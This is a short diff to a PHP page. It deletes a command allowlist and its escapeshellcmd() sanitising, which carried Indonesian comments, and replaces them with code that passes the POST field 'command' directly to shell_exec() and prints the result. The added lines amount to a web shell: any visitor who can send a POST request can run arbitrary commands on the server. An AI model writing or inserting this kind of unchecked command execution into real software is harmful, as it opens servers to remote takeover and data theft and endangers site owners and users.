@@ -16,17 +16,9 @@
     <pre>
         <?php
         if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-            // Daftar perintah yang diizinkan
-            $allowedCommands = ['ls', 'whoami', 'date']; // Tambahkan perintah lain yang diizinkan
-        
-            $command = escapeshellcmd($_POST['command']);
-
-            // if (in_array($command, $allowedCommands)) {
+            $command = $_POST['command'];
             $exec = shell_exec($command);
             echo htmlspecialchars($exec);
-            // } else {
-            //     echo "Perintah tidak diizinkan!";
-            // }
         }
         ?>
     </pre>
